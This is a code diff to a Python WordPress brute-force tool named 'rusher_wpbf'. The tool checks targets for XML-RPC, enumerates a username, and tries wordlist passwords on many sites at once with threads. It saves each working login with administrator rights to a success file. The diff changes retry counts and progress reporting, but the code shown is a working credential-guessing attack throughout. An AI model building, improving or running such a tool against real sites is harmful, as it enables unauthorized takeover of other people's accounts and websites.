@@ -67,35 +67,38 @@ class rusher_wpbf:
             if "<name>isAdmin</name>" in x.text:
 
                 open("result-wp/success.txt", "a").write("{}/wp-login.php|{}|{}\n".format(target, user, passwd))
-            
-            self.count_percent()
+
             self.done_process += 1
+            self.count_percent()            
 
         except:
 
-            if self.try_login < 5:
+            if self.try_login < 3:
 
-                self.try_login = self.try_login + 1
+                self.try_login += 1
                 self.req(target, user, passwd)
-
-            elif self.try_login > 5:
-
-                self.try_login = 0
-                self.count_percent()
                 self.done_process += 1
 
-        sys.stdout.write("\r[*] Proccess {} %".format(round(self.percent)))
-        sys.stdout.flush()
+            elif self.try_login > 3:
 
-    def execution(self, target, wordlist, thread):
+                self.try_login = 0
+                self.done_process += 1
+
+            self.count_percent()
+            sys.stdout.write("\r[*] Proccess [ {}/{} | {}% ]".format(self.done_process, self.total_process, round(self.percent)))
+            sys.stdout.flush()
+
+    def execution(self, target, thread):
         
         if self.check_xmlrpc(target):
 
             user = self.get_user(target)
 
+            self.total_process += len(open(self.args.wordlist).read().splitlines())
+
             with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
 
-                for x in open(wordlist, errors="ignore").read().split("\n"):
+                for x in open(self.args.wordlist).read().splitlines():
 
                     if x != '':
 
@@ -113,6 +116,7 @@ class rusher_wpbf:
 
         self.done_process = 0
         self.try_login = 0
+        self.total_process = 0
         parser = ArgumentParser()
         parser.add_argument("-x", "--target", required=True)
         parser.add_argument("-w", "--wordlist", required=True)
@@ -132,8 +136,7 @@ class rusher_wpbf:
 
                         if target != '':
 
-                            self.total_process = len(open(self.args.wordlist).read().splitlines()) * len(open(self.args.target).read().splitlines())
-                            executor.submit(self.execution, target, self.args.wordlist, self.args.thread)
+                            executor.submit(self.execution, target, self.args.thread)
 
             else:
 
@@ -145,8 +148,7 @@ class rusher_wpbf:
 
                 print("[*] Bruteforcing...")
 
-                self.total_process = len(open(self.args.wordlist).read().splitlines())
-                self.execution(self.args.target, self.args.wordlist, self.args.thread)
+                self.execution(self.args.target, self.args.thread)
 
             else:
 
